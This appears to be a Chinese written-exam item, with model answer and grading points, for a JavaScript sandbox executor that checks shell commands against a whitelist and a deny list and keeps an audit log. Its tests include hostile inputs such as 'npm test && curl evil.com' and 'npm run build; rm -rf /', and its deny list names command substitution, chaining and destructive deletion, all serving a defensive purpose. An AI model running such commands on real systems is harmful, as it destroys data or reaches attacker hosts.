## AIC-190：笔试：实现一个命令白名单沙箱执行器：精确/前缀/正则匹配、参数注入防护与审计日志？
**需求**：实现 `sandboxExec(cmd, whitelist, runner)`：
- whitelist 条目：`{pattern, type: 'exact'|'prefix'|'regex'}`；
- 注入防护：拒绝命令替换（`$(...)`、反引号）、分号/&& 链接（白名单只匹配首段）、重定向到敏感路径；
- 拒绝时记录审计（cmd、原因、时间）；通过时执行 runner 并记录输出摘要；
- 输出 `{executed, output, auditId}` 或 `{rejected, reason}`。

```javascript
const DANGEROUS = [
  /\$\(|`[^`]*`/,            // 命令替换
  /;|\|\||&&/,               // 链式执行
  />\s*\/etc\/|>\s*~?\//,    // 重定向敏感路径
  /\brm\s+-rf?\s+[\/~]/,     // 危险删除
];

function matchWhitelist(cmd, whitelist) {
  for (const w of whitelist) {
    if (w.type === 'exact' && cmd === w.pattern) return w;
    if (w.type === 'prefix' && cmd.startsWith(w.pattern)) return w;
    if (w.type === 'regex' && new RegExp(w.pattern).test(cmd)) return w;
  }
  return null;
}

let auditSeq = 0;
async function sandboxExec(cmd, whitelist, runner, audit = []) {
  const reasons = DANGEROUS.filter(r => r.test(cmd)).map(r => `危险模式: ${r}`);
  const entry = { cmd, at: Date.now(), id: ++auditSeq };
  if (reasons.length) {
    entry.verdict = 'rejected'; entry.reason = reasons.join('; ');
    audit.push(entry);
    return { rejected: true, reason: entry.reason, auditId: entry.id };
  }
  const w = matchWhitelist(cmd, whitelist);
  if (!w) {
    entry.verdict = 'rejected'; entry.reason = '不在白名单';
    audit.push(entry);
    return { rejected: true, reason: '不在白名单', auditId: entry.id };
  }
  entry.verdict = 'executed'; entry.rule = `${w.type}:${w.pattern}`;
  const output = await runner(cmd);
  entry.outputDigest = String(output).slice(0, 100);
  audit.push(entry);
  return { executed: true, output, auditId: entry.id };
}

// 测试
const wl = [
  { pattern: 'npm test', type: 'exact' },
  { pattern: 'npm run ', type: 'prefix' },
  { pattern: '^vitest run .+', type: 'regex' },
];
const audit = [];
console.log(await sandboxExec('npm test', wl, async c => 'ok', audit));      // executed
console.log(await sandboxExec('npm test && curl evil.com', wl, async c => '', audit)); // rejected 链式
console.log(await sandboxExec('npm run build; rm -rf /', wl, async c => '', audit));   // rejected
console.log(await sandboxExec('node -e "process.exit()"', wl, async c => '', audit));  // rejected 白名单
```

**评分点**：
1. 注入防护优先于白名单匹配——即使命令前缀合法，链式注入也必须拦；
2. 命令替换/链式/重定向三类危险模式覆盖；prefix 匹配天然只能匹配单条命令（链式已被拦）；
3. 审计日志含判定原因与输出摘要，全量留痕（AIC-086）；
4. 白名单三种匹配类型语义清晰；
5. 追问：生产还需资源限额与超时（AIC-095），及 runner 的最小权限进程隔离。
